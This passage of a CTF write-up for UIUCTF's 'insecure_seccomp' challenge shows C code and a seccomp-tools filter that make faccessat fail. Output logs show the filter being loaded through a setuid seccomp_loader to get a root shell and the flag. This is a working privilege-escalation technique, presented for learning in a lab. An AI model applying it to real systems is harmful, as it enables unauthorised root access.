	<span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">num_insns</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">insns</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">insns</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"%hu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">num_insns</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_insns</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"%04hx %02hhx %02hhx %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
		       <span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">code</span><span class="p">,</span>
		       <span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">jt</span><span class="p">,</span>
		       <span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">jf</span><span class="p">,</span>
		       <span class="n">insns</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">k</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Basically we can just slot our filter into the <code class="language-plaintext highlighter-rouge">insns</code> array, and we will be given the bytecode for all the instructions in the filter that we can just slot into <code class="language-plaintext highlighter-rouge">seccomp-loader</code>, EZ.</p>

<p>X3eRo0 and I (mainly X3eRo0) used <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a> to construct our filter. It has many features, one of which allows you to program a filter using a custom language. Heres what our solution looked like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A = sys_number                                                                                                                       
A == faccessat ? lol : done
lol:
return ERRNO(5)
done:
return ALLOW
kill:
return KILL
</code></pre></div></div>

<p>This, again is pretty simple, at least more simple than using the BPF macros (lol). All it does is store the syscall number, check if it == faccessat, and if it does set the return value/errno to 5, effectively causing the syscall to fail. If we do any other syscall it simply allows it to continue. the <code class="language-plaintext highlighter-rouge">kill</code> bit is not used.</p>

<p>You can dump this into BPF bytecode in <code class="language-plaintext highlighter-rouge">seccomp-tools</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nomu:~/D/u/insecure_seccomp
❯❯ seccomp-tools asm BPF.asm                                                                                                        
" \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\r\x01\x00\x00\x06\x00\x00\x00\x05\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00"
</code></pre></div></div>

<p>And X3eRo0 also modified the <code class="language-plaintext highlighter-rouge">starter.c</code> so that it works with a char* rather than a list of instructions:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/filter.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/syscall.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
        <span class="c1">// just paste your filter here</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">filters</span> <span class="o">=</span> <span class="s">" </span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\r\x01\x00\x00\x06\x00\x00\x00\x05\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span><span class="p">;</span>

        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">num_insns</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span> <span class="c1">// just count the number of instructions, we dont care.</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"%hu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">num_insns</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_insns</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"%04hx %02hhx %02hhx %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                       <span class="p">((</span><span class="k">struct</span> <span class="n">sock_filter</span><span class="o">*</span><span class="p">)</span><span class="n">filters</span><span class="p">)[</span><span class="n">i</span><span class="p">].</span><span class="n">code</span><span class="p">,</span>
                       <span class="p">((</span><span class="k">struct</span> <span class="n">sock_filter</span><span class="o">*</span><span class="p">)</span><span class="n">filters</span><span class="p">)[</span><span class="n">i</span><span class="p">].</span><span class="n">jt</span><span class="p">,</span>
                       <span class="p">((</span><span class="k">struct</span> <span class="n">sock_filter</span><span class="o">*</span><span class="p">)</span><span class="n">filters</span><span class="p">)[</span><span class="n">i</span><span class="p">].</span><span class="n">jf</span><span class="p">,</span>
                       <span class="p">((</span><span class="k">struct</span> <span class="n">sock_filter</span><span class="o">*</span><span class="p">)</span><span class="n">filters</span><span class="p">)[</span><span class="n">i</span><span class="p">].</span><span class="n">k</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Now when you compile+run <code class="language-plaintext highlighter-rouge">starter</code>, you should get your output as BPF bytecode:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nomu:~/D/u/insecure_seccomp
❯❯ ./starter                                                                                                                         
5                                                                                                                                    
0020 00 00 00000000
0015 00 01 0000010d
0006 00 00 00050005
0006 00 00 7fff0000
0006 00 00 00000000
</code></pre></div></div>

<p>Now when you send this on the remote service, while running <code class="language-plaintext highlighter-rouge">exploit_me</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin $ ./seccomp_loader ./exploit_me
5
0020 00 00 00000000
0015 00 01 0000010d
0006 00 00 00050005
0006 00 00 7fff0000
0006 00 00 00000000
/usr/local/bin # cat /flag
uiuctf{seccomp_plus_new_privs_equals_inseccomp_e84609bf}
/usr/local/bin #

</code></pre></div></div>

<p>You will get a root shell, and then flag.</p>

<h1 id="closing-thoughts">Closing thoughts</h1>

<p>Kernel is very complicated. Bold statements only here xD.</p>

<p>This was a pretty cool challenge, X3eRo0 and I both learned alot about BPF. I hope you did too.</p>

<p>Another lesson: Always <code class="language-plaintext highlighter-rouge">ls -la</code> to check whether a binary is setuid, and don’t just assume that every shell will have fancy syntax highlighting for you :P (this confused me for a while, I couldnt spot the setuid binary, lol).</p>

<h1 id="references">References</h1>

<ul>
  <li>https://unix.stackexchange.com/questions/562260/why-we-need-to-set-no-new-privs-while-before-calling-seccomp-mode-filter</li>
  <li>https://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html</li>
  <li>https://linux.die.net/man/2/openat</li>
  <li>https://man7.org/linux/man-pages/man7/capabilities.7.html</li>
  <li>http://bricktou.cn/include/linux/schedtask_no_new_privs_en.html</li>
  <li>https://elixir.bootlin.com/linux/v5.12.14/source/include/linux/sched.h#L1646</li>
</ul>
